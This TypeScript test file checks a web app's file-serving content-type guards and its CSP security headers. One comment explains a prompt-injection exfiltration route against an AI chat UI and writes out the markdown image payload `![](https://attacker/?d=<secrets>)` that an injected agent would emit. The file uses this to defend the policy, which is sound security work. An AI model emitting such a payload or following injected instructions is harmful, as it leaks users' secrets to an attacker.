/**
 * Content-type guards on the routes that serve files this product did not author.
 *
 * The audit these came from (2026-09-02) started from one SVG served inline and found
 * that nothing anywhere mitigated it — no nosniff, no CSP, checked against live prod
 * rather than the source. So this file pins two things: the guard behaves, and every
 * serving path actually calls it. The second half is source assertions, deliberately:
 * the routes are inside 3000-line files with no seam worth mocking, and a guard that
 * exists but is not called is exactly the failure being tested for.
 */

import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { guardFileResponse, isScriptableType } from './file-serving.js';

function fakeRes() {
  const headers: Record<string, string> = {};
  return {
    headers,
    setHeader(k: string, v: string) {
      headers[k.toLowerCase()] = v;
    },
  };
}

describe('the guard', () => {
  it('always sends nosniff, whatever the type', () => {
    // Without it the browser may disregard our Content-Type and guess from the
    // bytes, which makes every other decision here advisory.
    for (const type of [
      'image/png',
      'application/pdf',
      'text/plain',
      'application/octet-stream',
    ]) {
      const res = fakeRes();
      guardFileResponse(res as never, type);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    }
  });

  it('sandboxes the types that can execute as a document', () => {
    for (const type of [
      'image/svg+xml',
      'text/html',
      'application/xhtml+xml',
    ]) {
      const res = fakeRes();
      guardFileResponse(res as never, type);
      // A complete policy, not just 'sandbox': this replaces the app-wide CSP
      // (setHeader overwrites), and a file response should be allowed nothing.
      expect(res.headers['content-security-policy']).toBe(
        "sandbox; default-src 'none'",
      );
    }
  });

  it('does not sandbox an ordinary image or document', () => {
    // The sandbox is not free — it opaques the origin. It goes only where a script
    // could otherwise run.
    for (const type of [
      'image/png',
      'image/jpeg',
      'application/pdf',
      'text/plain',
    ]) {
      const res = fakeRes();
      guardFileResponse(res as never, type);
      expect(res.headers['content-security-policy']).toBeUndefined();
    }
  });

  it('sees through a charset parameter and casing', () => {
    expect(isScriptableType('image/svg+xml')).toBe(true);
    expect(isScriptableType('IMAGE/SVG+XML')).toBe(true);
    expect(isScriptableType('text/html; charset=utf-8')).toBe(true);
    expect(isScriptableType('image/png')).toBe(false);
  });
});

describe('every serving path calls it', () => {
  const SRC = join(__dirname, '..');
  const agents = readFileSync(join(SRC, 'api', 'routes', 'agents.ts'), 'utf-8');
  const files = readFileSync(join(SRC, 'api', 'routes', 'files.ts'), 'utf-8');
  const server = readFileSync(join(SRC, 'api', 'server.ts'), 'utf-8');

  it('workspace/file — the raw branch and the text branch', () => {
    expect(agents).toMatch(/guardFileResponse\(res, served\)/);
  });

  it('the file-content route in files.ts, image branch and the rest', () => {
    expect(files).toMatch(/guardFileResponse\(res, IMG_TYPES\[ext\]\)/);
    // Was a literal 'text/plain' until 2026-09-22, when every non-image file —
    // including a real .xlsx — turned out to be forced through a UTF-8 text decode
    // before a single byte left the server. Fixed to read as a Buffer and declare a
    // real MIME type per extension (mimeType), same pattern agents.ts already uses
    // for its own two streaming routes below — still one guardFileResponse call, on
    // every byte this route ever returns.
    expect(files).toMatch(/guardFileResponse\(res, mimeType\)/);
  });

  it('both streaming routes (outputs and artifacts)', () => {
    // These are safe today only because `.svg` is absent from MIME_MAP, and their
    // inline test is a `image/` prefix match — so the guard is what keeps adding an
    // entry to that map from silently becoming an XSS.
    const calls = agents.match(/guardFileResponse\(res, mimeType\)/g) ?? [];
    expect(calls.length).toBe(2);
  });

  it('MIME_MAP carries the warning that made those two safe by accident', () => {
    expect(agents).toMatch(/adding `?\.svg`? would silently/i);
  });

  it('nosniff is applied app-wide, not only on file routes', () => {
    // Moved into security-headers.ts when CSP and X-Frame-Options joined it.
    expect(server).toMatch(/app\.use\(securityHeaders\)/);
  });
});

describe('the app-wide security headers', () => {
  it('enforces only what cannot break this app, and report-onlys the rest', async () => {
    const { _policies } = await import('./security-headers.js');
    // Each of these closes a real attack and none can break the dashboard — verified
    // live, the page rendered normally with all four enforced.
    for (const d of [
      'frame-ancestors',
      'object-src',
      'base-uri',
      'form-action',
    ]) {
      expect(_policies.ENFORCED_DIRECTIVES).toContain(d);
    }
    // The risky half must NOT be in the enforced set while the flag is off.
    for (const d of ['script-src', 'style-src', 'connect-src', 'img-src']) {
      expect(_policies.ENFORCED_DIRECTIVES).not.toContain(d);
    }
  });

  it('the full policy still covers everything the app actually uses', () => {
    // Each entry is here because something real needs it. If one is dropped, the
    // feature it serves breaks the moment CSP_ENFORCE is flipped — which is a much
    // worse time to find out than now.
    const p = _fullPolicy();
    expect(p).toContain("'unsafe-eval'"); // Pyodide, tsc
    expect(p).toContain('https://cdn.jsdelivr.net'); // Pyodide, tsc
    expect(p).toContain('https://cdnjs.cloudflare.com'); // sql.js
    expect(p).toContain('https://fonts.gstatic.com'); // Google Fonts
    expect(p).toMatch(/img-src[^;]*data:/); // live browser frames
    expect(p).toMatch(/connect-src[^;]*wss:/); // Socket.IO
    expect(p).toMatch(/frame-src[^;]*blob:/); // JsRunner srcdoc iframe
  });

  it('is enforcing, and the evidence for that is recorded beside the flag', () => {
    // Flipped 2026-09-02 after two live browser runs: the real logged-out app under
    // this policy (zero violations), and a page under the EXACT policy performing
    // every operation the risky directives cover — eval, new Function, data:/blob:
    // images, a ws:// connect, a sandboxed srcdoc iframe, both CDNs (10/10).
    expect(_enforceFlag()).toBe(true);
    const src = readFileSync(join(__dirname, 'security-headers.ts'), 'utf-8');
    // Anyone flipping this back, or forward again, has to say why here.
    expect(src).toMatch(/csp_enforce_harness|10\/10/);
  });

  it('img-src still has no https:, which is a deliberate anti-exfiltration choice', () => {
    // An absolute image URL in agent-authored markdown is the standard exfil channel
    // against an AI chat UI: a prompt-injected agent writes
    // ![](https://attacker/?d=<secrets>) and the browser fetches it automatically.
    // Adding https: here reopens that. If it is ever added, it should be because
    // someone decided to, not because a test did not notice.
    const p = _fullPolicy();
    const imgSrc = p.match(/"img-src[^"]*"/)?.[0] ?? '';
    // A BARE `https:` scheme-source is the thing that reopens it — specific hosts
    // (GA) are fine and are why a plain .toContain('https:') would be wrong here.
    expect(imgSrc).not.toMatch(/https:(?!\/\/)/);
    expect(imgSrc).toContain('data:'); // live browser frames still work
  });
});

function _fullPolicy(): string {
  const src = readFileSync(join(__dirname, 'security-headers.ts'), 'utf-8');
  return src.slice(
    src.indexOf('const FULL_DIRECTIVES'),
    src.indexOf('export function securityHeaders'),
  );
}

function _enforceFlag(): boolean {
  const src = readFileSync(join(__dirname, 'security-headers.ts'), 'utf-8');
  return /const CSP_ENFORCE = true/.test(src);
}
